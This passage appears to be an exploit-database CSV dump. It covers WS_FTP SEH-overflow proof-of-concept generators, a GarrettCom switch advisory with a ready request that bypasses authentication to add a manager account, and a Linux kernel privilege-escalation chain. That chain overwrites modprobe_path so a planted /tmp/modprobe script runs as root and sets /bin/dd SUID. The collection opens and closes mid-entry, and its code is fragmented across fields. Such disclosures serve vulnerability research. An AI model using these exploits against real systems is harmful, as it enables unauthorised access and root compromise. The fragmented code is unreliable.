RDI: 0x7ffff0c182a0 --> 0x7ffff6478a10 --> 0x7ffff5986230 (<Js::DynamicObject::Finalize(bool)>: push   rbp)
RBP: 0x7fffffff2130 --> 0x7fffffff21b0 --> 0x7fffffff2400 --> 0x7fffffff2480 --> 0x7fffffff24d0 --> 0x7fffffff52f0 (--> ...)
RSP: 0x7fffffff20c0 --> 0x1111015500000002
RIP: 0x7ffff0b204da (mov    rdx,QWORD PTR [rdx+r13*8])
R8 : 0x0
R9 : 0x0
R10: 0x7ffff0b20400 (movabs rax,0x555555879018)
R11: 0x206
R12: 0x7fffffff5580 --> 0x7ffff0ba0000 --> 0xeb021a471b4f1a4f
R13: 0x1000000000001 << Var 1
R14: 0x1000000000003
R15: 0x7ffff0c79040 --> 0x7ffff643c050 --> 0x7ffff5521130 (<Js::RecyclableObject::Finalize(bool)>:  push   rbp)
EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x7ffff0b204cb:  cmp    ecx,0x26
0x7ffff0b204ce:  jg     0x7ffff0b204e1
0x7ffff0b204d0:  movabs rdx,0x7ffff0b20667
=> 0x7ffff0b204da:  mov    rdx,QWORD PTR [rdx+r13*8]
0x7ffff0b204de:  rex.W jmp rdx
We can simply think as follows.
Before the CSE phase:
Var j = ToVar(i - 2);
int32_t offset = i - 2;
jmp jump_table[offset];
After the CSE phase:
Var j = ToVar(i - 2);
jmp jump_table[j];"
2017-11-03,DoS,Windows,Kevin McGuigan,Ipswitch WS_FTP Professional < 12.6.0.3,Local Buffer Overflow (SEH),"#!/usr/bin/python
#Title: Ipswitch WS_FTP Professional Local Buffer Overflow (SEH)
#Author: Kevin McGuigan. Twitter: @_h3xagram
#Author Website: https://www.7elements.co.uk
#Vendor Website: https://www.ipswitch.com
#Date: 03/11/2017
#Version: 12.6.03
#CVE: CVE-2017-16513
#Tested on: Windows 7 32-bit
#Use script to generate payload. Paste payload into search field, replace Ds with shellcode.
#nSEH = ""\x74\x08\x90\x90""
#SEH = ""\x31\x2D\x91\x23""","buffer = ""A"" * 840
nSEH = ""B"" * 4
SEH = ""C"" * 4
f = open (""poc.txt"", ""w"")
f.write(buffer + nSEH + SEH + ""D"" * 200)
f.close()"
2017-05-19,WebApps,PHP,David Tomaschik,Belden Garrettcom 6K/10K Switches,Authentication Bypass / Memory Corruption,"http://www.belden.com/docs/upload/Belden-GarrettCom-MNS-6K-10K-Security-Bulletin-BSECV-2017-8.pdf
#User Management#","Introduction
Vulnerabilities were identified in the Belden GarrettCom 6K and 10KT
(Magnum) series network switches. These were discovered during a black box
assessment and therefore the vulnerability list should not be considered
exhaustive; observations suggest that it is likely that further vulnerabilities
exist. It is strongly recommended that GarrettCom undertake a full whitebox
security assessment of these switches.
The version under test was indicated as: 4.6.0.  Belden Garrettcom released
an advisory on 8 May 2017, indicating that issues were fixed in 4.7.7:
GarrettCom-01 - Authentication Bypass: Hardcoded Web Interface Session Token
Severity: **High**
The string ""GoodKey"" can be used in place of a session token for the web
interface, allowing a complete bypass to all web interface authentication.
The following request/response demonstrates adding a user ‘gibson’ with the
password ‘god’ on any GarrettCom 6K or 10K switch.
GET /gc/service.php?a=addUser&uid=gibson&pass=god&type=manager&key=GoodKey
HTTP/1.1
Host: 192.168.0.2
Connection: close
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/56.0.2924.28 Safari/537.36
Accept: */*
Referer: https://192.168.0.2/gc/flash.php
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
HTTP/1.0 200 OK
Server: GoAhead-Webs
Content-Type: text/html
<?xml version='1.0' encoding='UTF-8'?><data val=""users""><changed
val=""yes"" />
<helpfile val=""user_accounts.html"" />
<user uid=""operator"" access=""Operator"" />
<user uid=""manager"" access=""Manager"" />
<user uid=""gibson"" access=""Manager"" />
</data>
GarrettCom-02 - Secrets Accessible to All Users
Severity: **High**
Unprivileged but authenticated users (""operator"" level access) can view the
plaintext passwords of all users configured on the system, allowing them to
escalate privileges to ""manager"" level.  While the default ""show config""
masks the passwords, executing ""show config saved"" includes the plaintext
passwords. The value of the ""secrets"" setting does not affect this.
6K>show config group=user saved
user
add user=gibson level=2 pass=god
Exit
GarrettCom-03 - Stack Based Buffer Overflow in HTTP Server
Severity: **High**
When rendering the /gc/flash.php page, the server performs URI encoding of
the Host header into a fixed-length buffer on the stack.  This decoding appears
unbounded and can lead to memory corruption, possibly including remote code
execution.  Sending garbage data appears to hang the webserver thread after
responding to the present request.  Requests with Host headers longer than
220 characters trigger the observed behavior.
GET /gc/flash.php HTTP/1.1
Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/56.0.2924.28 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
GarrettCom-04 - SSL Keys Shared Across Devices
Severity: **Moderate**
The SSL certificate on all devices running firmware version 4.6.0 is the
same.  This issue was previously reported and an advisory released by
ICS-CERT.  While GarrettCom reported the issue was fixed in 4.5.6, the web
server certificate remains static in 4.6.0:
openssl s_client -connect 192.168.0.5:443 -showcerts
CONNECTED(00000003)
depth=0 C = US, ST = California, L = Fremont, O = Belden, OU =
Technical Support, CN = 192.168.1.2, emailAddress = gcisupport@belden.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Fremont, O = Belden, OU =
Technical Support, CN = 192.168.1.2, emailAddress = gcisupport@belden.com
verify return:1
Certificate chain
0 s:/C=US/ST=California/L=Fremont/O=Belden/OU=Technical Support/CN=
192.168.1.2/emailAddress=gcisupport@belden.com
i:/C=US/ST=California/L=Fremont/O=Belden/OU=Technical Support/CN=
192.168.1.2/emailAddress=gcisupport@belden.com
-----BEGIN CERTIFICATE-----
MIIEtTCCA52gAwIBAgIBADANBgkqhkiG9w0BAQUFADCBnTELMAkGA1UEBhMCVVMx
EzARBgNVBAgTCkNhbGlmb3JuaWExEDAOBgNVBAcTB0ZyZW1vbnQxDzANBgNVBAoT
BkJlbGRlbjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQxFDASBgNVBAMTCzE5
Mi4xNjguMS4yMSQwIgYJKoZIhvcNAQkBFhVnY2lzdXBwb3J0QGJlbGRlbi5jb20w
HhcNMTUxMDI3MTEyNzQ2WhcNMjUxMDI0MTEyNzQ2WjCBnTELMAkGA1UEBhMCVVMx
EzARBgNVBAgTCkNhbGlmb3JuaWExEDAOBgNVBAcTB0ZyZW1vbnQxDzANBgNVBAoT
BkJlbGRlbjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQxFDASBgNVBAMTCzE5
Mi4xNjguMS4yMSQwIgYJKoZIhvcNAQkBFhVnY2lzdXBwb3J0QGJlbGRlbi5jb20w
ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFlt+j4OvpcgfdrFGnBxti
ds6r9sNEcR9JdAFbOmwybQkdqIw9Z9+teU/rixPocEE4gL8beNuw/D3lDc4RJ63m
1zuQ1riFOkTsz7koKQNWTh3CkIBE7843p5I/GVvhfR7xNCCmCWPdq+6/b3nhott5
oBeMLOjIWnjFgyVMsWR22JOYv+euWwr4oqZDLfBHjfipnu36J1E2kHLG3TL9uwyN
DUxtrIbvfi5tOxi8tx1bxZFQU1jxoQa725gO+1TOYzfSoY1a7/M0rMhJM1wFXak6
jbDbJLSv2TXMWrSJlGFUbCcKv3kE22zLcU/wx1Xl4a4NNvFW7Sf5OG2B+bFLr4fD
AgMBAAGjgf0wgfowHQYDVR0OBBYEFLtGmDWgd773vSkKikDFSz8VOZ7DMIHKBgNV
HSMEgcIwgb+AFLtGmDWgd773vSkKikDFSz8VOZ7DoYGjpIGgMIGdMQswCQYDVQQG
EwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEQMA4GA1UEBxMHRnJlbW9udDEPMA0G
A1UEChMGQmVsZGVuMRowGAYDVQQLExFUZWNobmljYWwgU3VwcG9ydDEUMBIGA1UE
AxMLMTkyLjE2OC4xLjIxJDAiBgkqhkiG9w0BCQEWFWdjaXN1cHBvcnRAYmVsZGVu
LmNvbYIBADAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUAA4IBAQBAiuv06CMD
ij+9bEZAfmHftptG4UqsNgYIFZ1sN7HC6RBR9xy45fWVcQN3l3KiyddLsftbZSOa
CRPpzqgpF58hGwAa7+yQPOjOWf+uLc9Oyex6P9ewAo6c5iiYI865FSQ+QCY4xbD1
Uk/WFV2LKOzxkXPRcVB4KR81g8tSZF3E8llybhEngg7cvN3uHpO5a5U085xuBbcF
To9PSbGKyJ7UGESBTD6KxLWAxoD6VGRV2CAZa/F9RTbdG1ZbTUMvoEDmYqv7Pjv/
ApZzztLJlCyhVM4N/jh/Q/g1VaQWuzPpza6utjN5soUxeZYJB6KwzGUiLnyTNBJz
L4JtsUO8AcWb
-----END CERTIFICATE-----
Note that Belden Garrettcom has addressed this issue by reinforcing that
users of the switches should install their own SSL certificates if they
do not want to use the default certificate and key.
GarrettCom-05 - Weak SSL Ciphers Enabled
Severity: **Moderate**
Many of the SSL ciphers available for the switch are outdated or use
insecure ciphers or hashes.  Additionally, no key exchanges with perfect forward
secrecy are offered, rendering all previous communications possibly compromised,
given the issue reported above.  Particularly of note is the use of 56-bit DES,
RC4, and MD5-based MACs.
ssl3: AES256-SHA
ssl3: CAMELLIA256-SHA
ssl3: DES-CBC3-SHA
ssl3: AES128-SHA
ssl3: SEED-SHA
ssl3: CAMELLIA128-SHA
ssl3: RC4-SHA
ssl3: RC4-MD5
ssl3: DES-CBC-SHA
tls1: AES256-SHA
tls1: CAMELLIA256-SHA
tls1: DES-CBC3-SHA
tls1: AES128-SHA
tls1: SEED-SHA
tls1: CAMELLIA128-SHA
tls1: RC4-SHA
tls1: RC4-MD5
tls1: DES-CBC-SHA
tls1_1: AES256-SHA
tls1_1: CAMELLIA256-SHA
tls1_1: DES-CBC3-SHA
tls1_1: AES128-SHA
tls1_1: SEED-SHA
tls1_1: CAMELLIA128-SHA
tls1_1: RC4-SHA
tls1_1: RC4-MD5
tls1_1: DES-CBC-SHA
tls1_2: AES256-GCM-SHA384
tls1_2: AES256-SHA256
tls1_2: AES256-SHA
tls1_2: CAMELLIA256-SHA
tls1_2: DES-CBC3-SHA
tls1_2: AES128-GCM-SHA256
tls1_2: AES128-SHA256
tls1_2: AES128-SHA
tls1_2: SEED-SHA
tls1_2: CAMELLIA128-SHA
tls1_2: RC4-SHA
tls1_2: RC4-MD5
tls1_2: DES-CBC-SHA
GarrettCom-06 - Weak HTTP session key generation
Severity: **Moderate**
The HTTP session key generation is predictable due to the lack of
randomness in the generation process. The key is generated by hashing the
previous hash result with the current time unit with precision around 50 unit
per second. The previous hash is replaced with a fixed salt for the first hash
generation.
The vulnerability allows an attacker to predict the first key that’s
generated by the switch if he has some knowledge about when the key was generated.
Alternatively, the vulnerability also enables privilege escalation attacks
which predict all future keys by observing two consecutive key generations of
lower privileges.
Timeline
2017/01/?? - Issues Discovered
2017/01/27 - Reported to BEL-SM-PSIRT@belden.com
2017/04/27 - 90 day timeline expires, Belden reports patched release forthcoming.
2017/05/08 - Belden releases update & advisory.
2017/05/15 - Disclosure published
Discovery
These issues were discovered by Andrew Griffiths, David Tomaschik, and
Xiaoran Wang of the Google Security Assessments Team."
2012-10-19,Local,Linux,halfdog,Vm86,Syscall Task Switch Kernel Panic Denial of Service / Privilege Escalation,"Source: http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/
## Introduction
## Methods
/** This software is provided by the copyright owner ""as is"" and any
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/vm86.h>
#include <unistd.h>
// IF_MASK|IOPL_MASK
/** This software is provided by the copyright owner ""as is"" and any
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/vm86.h>
#include <unistd.h>
// IF_MASK|IOPL_MASK
// Do not use stack above
/** This software is provided by the copyright owner ""as is"" and any
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>
// Cleanup beforehand to avoid interference from previous run
// down_write just adds 0xffff0001 at location offset +0x6c of
// the memory address given below. shmem_xattr_handlers handlers are
// at 0xc150ae1c and contain two valid handlers, terminated by
// a NULL value. As we are lucky, the value after NULL is 1, thus
// adding 0xffff0001 shmem_xattr_handlers + 0x6c + 0xa will turn
// the NULL into 0x10000 and the following 1 into NULL, hence
// the handler list is terminated correctly again.
// This might be too short on faster CPUs?
// Cleanup afterwards
// Enable FPU exceptions
// Terminate immediately, this seems to improve results
/** This software is provided by the copyright owner ""as is"" and any
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
// Switch the modprobe helper path from /sbin to /tmp. Address is
// known from kernel version's symbols file
// Create a pseudo-binary with just NULL bytes, executing it will
// trigger the binfmt module loading","Problem description: The initial observation was, that the linux vm86 syscall, which allows to use the virtual-8086 mode from userspace for emulating of old 8086 software as done with dosemu, was prone to trigger FPU errors. Closer analysis showed, that in general, the handling of the FPU control register and unhandled FPU-exception could trigger CPU-exceptions at unexpected locations, also in ring-0 code. Key player is the emms instruction, which will fault when e.g. cr0 has bits set due to unhandled errors. This only affects kernels on some processor architectures, currently only AMD K7/K8 seems to be relevant.
Virtual86SwitchToEmmsFault.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/Virtual86SwitchToEmmsFault.c) was the first POC, that triggers kernel-panic via vm86 syscall. Depending on task layout and kernel scheduler timing, the program might just cause an OOPS without heavy side-effects on the system. OOPS might happen up to 1min after invocation, depending on the scheduler operation and which of the other tasks are using the FPU. Sometimes it causes recursive page faults, thus locking up the entire machine.
To allow reproducible tests on at least a local machine, the random code execution test tool (Virtual86RandomCode.c - http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/Virtual86RandomCode.c) might be useful. It still uses the vm86-syscall, but executes random code, thus causing the FPU and task schedule to trigger a multitude of faults and to faster lock-up the system. When executed via network, executed random data can be recorded and replayed even when target machine locks up completely. Network test:
socat TCP4-LISTEN:1234,reuseaddr=1,fork=1 EXEC:./Virtual86RandomCode,nofork=1
tee TestInput < /dev/urandom | socat - TCP4:x.x.x.x:1234 > ProcessedBlocks
An improved version allows to bring the FPU into the same state without using the vm86-syscall. The key instruction is fldcw (floating point unit load control word). When enabling exceptions in one process just before exit, the task switch of two other processes later on might fail. It seems that due to that failure, the task->nsproxy ends up being NULL, thus causing NULL-pointer dereference in exit_shm during do_exit.
When the NULL-page is mapped, the NULL-dereference could be used to fake a rw-semaphore data structure. In exit_shm, the kernel attemts to down_write the semaphore, which adds the value 0xffff0001 at a user-controllable location. Since the NULL-dereference does not allow arbitrary reads, the task memory layout is unknown, thus standard change of EUID of running task is not possible. Apart from that, we are in do_exit, so we would have to change another task. A suitable target is the shmem_xattr_handlers list, which is at an address known from System.map. Usually it contains two valid handlers and a NULL value to terminate the list. As we are lucky, the value after NULL is 1, thus adding 0xffff0001 to the position of the NULL-value plus 2 will will turn the NULL into 0x10000 (the first address above mmap_min_addr) and the following 1 value into NULL, thus terminating the handler list correctly again.
The code to perform those steps can be found in FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c)
The modification of the shmem_xattr_handlers list is completely silent (could be a nice data-only backdoor) until someone performs a getxattr call on a mounted tempfs. Since such a file-system is mounted by default at /run/shm, another program can turn this into arbitrary ring-0 code execution. To avoid searching the process list to give EUID=0, an alternative approach was tested. When invoking the xattr-handlers, a single integer value write to another static address known from System.map (modprobe_path) will change the default modprobe userspace helper pathname from /sbin/modprobe to /tmp//modprobe. When unknown executable formats or network protocols are requested, the program /tmp//modprobe is executed as root, this demo just adds a script to turn /bin/dd into a SUID-binary. dd could then be used to modify libc to plant another backdoor there. The code to perform those steps can be found in ManipulatedXattrHandlerForPrivEscalation.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ManipulatedXattrHandlerForPrivEscalation.c).
--- Virtual86SwitchToEmmsFault.c ---
*  expressed or implied warranties, including, but not limited to,
*  the implied warranties of merchantability and fitness for a particular
*  purpose are disclaimed. In no event shall the copyright owner be
*  liable for any direct, indirect, incidential, special, exemplary or
*  consequential damages, including, but not limited to, procurement
*  of substitute goods or services, loss of use, data or profits or
*  business interruption, however caused and on any theory of liability,
*  whether in contract, strict liability, or tort, including negligence
*  or otherwise, arising in any way out of the use of this software,
*  even if advised of the possibility of such damage.
*  Copyright (c) 2013 halfdog <me (%) halfdog.net>
*  This progam maps memory pages to the low range above 64k to
*  avoid conflicts with /proc/sys/vm/mmap_min_addr and then
*  triggers the virtual-86 mode. Due to unhandled FPU errors,
*  task switch will fail afterwards, kernel will attempt to
*  kill other tasks when switching.
*  gcc -o Virtual86SwitchToEmmsFault Virtual86SwitchToEmmsFault.c
*  See http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ for more information.
static const char *DEDICATION=""To the most adorable person met so far."";
static void handleSignal(int value, siginfo_t *sigInfo, void *context) {
fprintf(stderr, ""Handling signal\n"");
void runTest(void *realMem) {
struct vm86plus_struct vm86struct;
intresult;
memset(&vm86struct, 0, sizeof(vm86struct));
vm86struct.regs.eip=0x0;
vm86struct.regs.cs=0x1000;
vm86struct.regs.eflags=0x3002;
vm86struct.regs.esp=0x400;
vm86struct.regs.ss=0x1000;
vm86struct.regs.ebp=vm86struct.regs.esp;
vm86struct.regs.ds=0x1000;
vm86struct.regs.fs=0x1000;
vm86struct.regs.gs=0x1000;
vm86struct.flags=0x0L;
vm86struct.screen_bitmap=0x0L;
vm86struct.cpu_type=0x0L;
alarm(1);
result=vm86(VM86_ENTER, &vm86struct);
if(result) {
fprintf(stderr, ""vm86 failed, error %d (%s)\n"", errno,
strerror(errno));
int main(int argc, char **argv) {
struct sigaction sigAction;
intrealMemSize=1<<20;
void*realMem;
intresult;
sigAction.sa_sigaction=handleSignal;
sigfillset(&sigAction.sa_mask);
sigAction.sa_flags=SA_SIGINFO;
sigAction.sa_restorer=NULL;
sigaction(SIGILL, &sigAction, NULL); // 4
sigaction(SIGFPE, &sigAction, NULL); // 8
sigaction(SIGSEGV, &sigAction, NULL); // 11
sigaction(SIGALRM, &sigAction, NULL); // 14
realMem=mmap((void*)0x10000, realMemSize, PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
if(realMem==(void*)-1) {
fprintf(stderr, ""Failed to map real-mode memory space\n"");
return(1);
memset(realMem, 0, realMemSize);
memcpy(realMem, ""\xda\x44\x00\xd9\x2f\xae"", 6);
runTest(realMem);
--- EOF ---
--- Virtual86RandomCode.c ---
*  expressed or implied warranties, including, but not limited to,
*  the implied warranties of merchantability and fitness for a particular
*  purpose are disclaimed. In no event shall the copyright owner be
*  liable for any direct, indirect, incidential, special, exemplary or
*  consequential damages, including, but not limited to, procurement
*  of substitute goods or services, loss of use, data or profits or
*  business interruption, however caused and on any theory of liability,
*  whether in contract, strict liability, or tort, including negligence
*  or otherwise, arising in any way out of the use of this software,
*  even if advised of the possibility of such damage.
*  Copyright (c) 2013 halfdog <me (%) halfdog.net>
*  This progam maps memory pages to the low range above 64k to
*  avoid conflicts with /proc/sys/vm/mmap_min_addr and then
*  triggers the virtual-86 mode.
*  gcc -o Virtual86RandomCode Virtual86RandomCode.c
*  Usage: ./Virtual86RandomCode < /dev/urandom > /dev/null
*  See http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ for more information.
static const char *DEDICATION=""To the most adorable person met so far."";
static void handleSignal(int value, siginfo_t *sigInfo, void *context) {
fprintf(stderr, ""Handling signal\n"");
int readFully(int inputFd, void *data, int length) {
int readLength=0;
int result;
while(length) {
result=read(inputFd, data, length);
if(result<0) {
if(!readLength) readLength=result;
break;
readLength+=result;
length-=result;
data+=result;
return(readLength);
void runTest(void *realMem) {
struct vm86plus_structvm86struct;
intresult;
memset(&vm86struct, 0, sizeof(vm86struct));
vm86struct.regs.eip=0x0;
vm86struct.regs.cs=0x1000;
vm86struct.regs.eflags=0x3002;
vm86struct.regs.esp=0x400;
vm86struct.regs.ss=0x1000;
vm86struct.regs.ebp=vm86struct.regs.esp;
vm86struct.regs.ds=0x1000;
vm86struct.regs.fs=0x1000;
vm86struct.regs.gs=0x1000;
vm86struct.flags=0x0L;
vm86struct.screen_bitmap=0x0L;
vm86struct.cpu_type=0x0L;
alarm(1);
result=vm86(VM86_ENTER, &vm86struct);
if(result) {
fprintf(stderr, ""vm86 failed, error %d (%s)\n"", errno,
strerror(errno));
int main(int argc, char **argv) {
struct sigaction sigAction;
intrealMemSize=1<<20;
void*realMem;
intrandomFd=0;
intresult;
sigAction.sa_sigaction=handleSignal;
sigfillset(&sigAction.sa_mask);
sigAction.sa_flags=SA_SIGINFO;
sigAction.sa_restorer=NULL;
sigaction(SIGILL, &sigAction, NULL); // 4
sigaction(SIGFPE, &sigAction, NULL); // 8
sigaction(SIGSEGV, &sigAction, NULL); // 11
sigaction(SIGALRM, &sigAction, NULL); // 14
realMem=mmap((void*)0x10000, realMemSize, PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
if(realMem==(void*)-1) {
fprintf(stderr, ""Failed to map real-mode memory space\n"");
return(1);
result=readFully(randomFd, realMem, realMemSize);
if(result!=realMemSize) {
fprintf(stderr, ""Failed to read random data\n"");
return(0);
write(1, &result, 4);
write(1, realMem, realMemSize);
while(1) {
runTest(realMem);
result=readFully(randomFd, realMem, 0x1000);
write(1, &result, 4);
write(1, realMem, result);
--- EOF ---
--- FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c ---
*  expressed or implied warranties, including, but not limited to,
*  the implied warranties of merchantability and fitness for a particular
*  purpose are disclaimed. In no event shall the copyright owner be
*  liable for any direct, indirect, incidential, special, exemplary or
*  consequential damages, including, but not limited to, procurement
*  of substitute goods or services, loss of use, data or profits or
*  business interruption, however caused and on any theory of liability,
*  whether in contract, strict liability, or tort, including negligence
*  or otherwise, arising in any way out of the use of this software,
*  even if advised of the possibility of such damage.
*  Copyright (c) 2014 halfdog <me (%) halfdog.net>
*  This progam maps a NULL page to exploit a kernel NULL-dereferences,
*  Usually that will not work due to sane /proc/sys/vm/mmap_min_addr
*  settings. An unhandled FPU error causes part of task switching
*  to fail resulting in NULL-pointer dereference. This can be
*  used to add 0xffff0001 to an arbitrary memory location, one
*  of the entries in shmem_xattr_handlers is quite suited because
*  it has a static address, which can be found in System.map.
*  Another tool (ManipulatedXattrHandlerForPrivEscalation.c)
*  could then be used to invoke the xattr handlers, thus giving
*  local root privilege escalation.
*  gcc -o FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c
*  See http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ for more information.
static const char *DEDICATION=""To the most adorable person met so far."";
int main(int argc, char **argv) {
intchildPid;
intsockFds[2];
intlocalSocketFd;
intrequestCount;
intresult;
asm volatile (
""emms;""
: // output (0)
childPid=fork();
if(childPid>0) {
mmap((void*)0, 1<<12, PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
*((int*)0x8)=0xc150adba;
result=socketpair(AF_UNIX, SOCK_STREAM, 0, sockFds);
result=fork();
close(sockFds[result?1:0]);
localSocketFd=sockFds[result?0:1];
asm volatile (
""emms;""
: // output (0)
fprintf(stderr, ""Playing task switch ping-pong ...\n"");
for(requestCount=0x10000; requestCount; requestCount--) {
result=write(localSocketFd, sockFds, 4);
if(result!=4) break;
result=read(localSocketFd, sockFds, 4);
if(result!=4) break;
asm volatile (
""fldz;""
""fldz;""
""fdivp;""
: // output (0)
close(localSocketFd);
fprintf(stderr, ""Switch loop terminated\n"");
asm volatile (
""emms;""
: // output (0)
return(0);
usleep(10000);
asm volatile (
""fdivp;""
""fstcw %0;""
""andl $0xffc0, %0;""
""fldcw %0;""
: ""=m""(result) // output (0)
:""%eax"" // Clobbered register
return(0);
--- EOF ---
--- ManipulatedXattrHandlerForPrivEscalation.c ---
*  expressed or implied warranties, including, but not limited to,
*  the implied warranties of merchantability and fitness for a particular
*  purpose are disclaimed. In no event shall the copyright owner be
*  liable for any direct, indirect, incidential, special, exemplary or
*  consequential damages, including, but not limited to, procurement
*  of substitute goods or services, loss of use, data or profits or
*  business interruption, however caused and on any theory of liability,
*  whether in contract, strict liability, or tort, including negligence
*  or otherwise, arising in any way out of the use of this software,
*  even if advised of the possibility of such damage.
*  Copyright (c) 2014 halfdog <me (%) halfdog.net>
*  This progam prepares memory so that the manipulated shmem_xattr_handlers
*  (see FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c)
*  will be read from here, thus giving ring-0 code execution.
*  To avoid fiddling with task structures, this will overwrite
*  just 4 bytes of modprobe_path, which is used by the kernel
*  when unknown binary formats or network protocols are requested.
*  In the end, when executing an unknown binary format, the modified
*  modprobe script will just turn ""/bin/dd"" to be SUID, e.g. to
*  own libc later on.
*  gcc -o ManipulatedXattrHandlerForPrivEscalation ManipulatedXattrHandlerForPrivEscalation.c
*  See http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ for more information.
static const char *DEDICATION=""To the most adorable person met so far."";
int main(int argc, char **argv) {
void *handlerPage;
int*handlerStruct;
void*handlerCode;
char*modprobeCommands=""#!/bin/sh\nchmod u+s /bin/dd\n"";
intresult;
handlerStruct=(int*)0x10000;
handlerPage=mmap((void*)(((int)handlerStruct)&0xfffff000), 1<<12,
PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
if(handlerPage==(void*)-1) {
fprintf(stderr, ""Failed to map handler page\n"");
return(1);
fprintf(stderr, ""Handler page at %p\n"", handlerPage);
*handlerStruct=(int)(handlerStruct+0x10); // Prefix pointer
strcpy((char*)(handlerStruct+0x10), ""system""); // Prefix value
handlerCode=(void*)(handlerStruct+0x100);
*(handlerStruct+0x2)=(int)handlerCode; // list
*(handlerStruct+0x3)=(int)handlerCode; // get
*(handlerStruct+0x4)=(int)handlerCode; // set
memcpy(handlerCode, ""\xb8\xa1\x2d\x50\xc1\xc7\x00tmp/\xc3"", 12);
result=getxattr(""/run/shm/"", ""system.dont-care"", handlerPage, 1);
fprintf(stderr, ""Setattr result: 0x%x, error %d (%s)\n"", result,
errno, strerror(errno));
result=open(""/tmp/modprobe"", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
write(result, modprobeCommands, strlen(modprobeCommands));
close(result);
result=open(""/tmp/dummy"", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
memset(handlerPage, 0, 1<<12);
write(result, handlerPage, 1<<12);
close(result);
*(int*)handlerPage=(int)""/tmp/dummy"";
execve(""/tmp/dummy"", handlerPage, NULL);
return(0);
--- EOF ---"
2016-05-10,DoS,Windows,Zahid Adeel,Ipswitch WS_FTP LE 12.3,Search field Overwrite (SEH) (PoC),"#!/usr/bin/python
#Author: Zahid Adeel
#Author Email: exploiter.zee@gmail.com
#Title: Ipswitch WS_FTP LE 12.3 - Search field SEH Overwrite POC
#Vendor Homepage: http://www.wsftple.com/
#Software Link: http://www.wsftple.com/download.aspx
#Version: LE 12.3
#Tested on: Windows 8.1 x64 Pro
#Date: 2016-05-10
#Steps:
#Run WS_FTP LE client, Navigate to ""Local Search"" option in the Tools menu, paste the contents of wsftple-poc.txt in search field and press Enter.","fname=""wsftple-poc.txt""
junk = ""A"" * 840
n_seh = ""BBBB""
seh = ""CCCC""
padding = ""F"" * (1000 - len(junk) - 8)
poc = junk + n_seh + ppr + padding
fhandle = open(fname , 'wb')
fhandle.write(poc)
fhandle.close()"
2016-04-20,DoS,Windows,Google Security Research,Hyper-V,'vmswitch.sys' VmsMpCommonPvtHandleMulticastOids Guest to Host Kernel-Pool Overflow,Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=688,"This function is reachable by sending a RNDIS Set request with OID 0x01010209 (OID_802_3_MULTICAST_LIST) from the Guest to the Host.
This function potentially allocates a buffer based on the addresses sent.
The number of entries is determined by dividing the length of the data by 6:
.text:000000000001D717 mov eax, 0AAAAAAABh
.text:000000000001D71C mov r13b, 1
.text:000000000001D71F mul r14d
.text:000000000001D722 mov ebp, edx
.text:000000000001D724 shr ebp, 2
.text:000000000001D727 test ebp, ebp ; ebp=r14d//6
.text:000000000001D729 jz loc_31B04
